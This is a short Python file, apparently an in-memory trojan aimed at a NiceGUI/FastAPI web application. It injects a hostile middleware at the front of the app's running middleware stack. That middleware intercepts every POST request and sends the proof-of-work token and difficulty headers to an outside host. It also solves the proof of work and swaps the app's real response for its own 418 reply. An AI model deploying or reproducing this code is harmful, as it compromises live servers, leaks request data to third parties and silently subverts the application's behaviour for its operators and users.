from fastapi import Request, Response
from nicegui import app
from starlette.middleware import Middleware
from starlette.middleware.base import BaseHTTPMiddleware

print("mem_trojan.py is running")


async def hijack_request(request: Request, call_next):
    resp: Response = await call_next(request)

    if request.method != "POST":
        return resp

    try:
        token = request.headers["x-pow-token"]
        diff = int(request.headers["x-pow-difficulty"])
    except Exception as e:
        print("error", e)
        return resp

    import httpx

    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://example.com/",
            data={"token": token, "difficulty": diff},
        )
        print(r.text)

    print("token", token)
    from anyio.to_thread import run_sync

    def pow(token: str, difficulty: int):
        import hashlib
        import itertools

        for i in itertools.count():
            if (
                hashlib.sha256(token.encode() + str(i).encode())
                .hexdigest()
                .startswith("0" * difficulty)
            ):
                return str(i)
        raise RuntimeError("Failed to find a valid proof of work")

    proof = await run_sync(pow, token, diff)

    from fastapi.responses import JSONResponse

    return JSONResponse({"bar": proof}, status_code=418)


app.user_middleware.insert(0, Middleware(BaseHTTPMiddleware, dispatch=hijack_request))
app.middleware_stack = None
